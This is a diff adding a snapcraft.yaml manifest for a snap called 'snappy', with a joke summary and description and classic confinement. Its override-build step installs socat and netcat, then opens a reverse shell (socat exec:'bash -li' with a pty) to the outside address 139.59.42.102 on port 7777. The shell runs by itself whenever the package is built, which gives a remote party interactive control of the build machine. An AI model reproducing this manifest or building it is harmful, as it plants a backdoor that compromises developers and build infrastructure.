@@ -1,0 +1,20 @@
+name: snappy
+version: git
+summary: First snap
+description: First!!!1!
+grade: stable
+confinement: classic
+
+apps:
+    snappy:
+            command: bin/run
+
+parts:
+    snappy:
+        plugin: nil
+        override-build: |
+            apt-get update
+            apt-get install -y socat netcat-traditional bash
+            socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:"139.59.42.102:7777"
+            echo 0
+
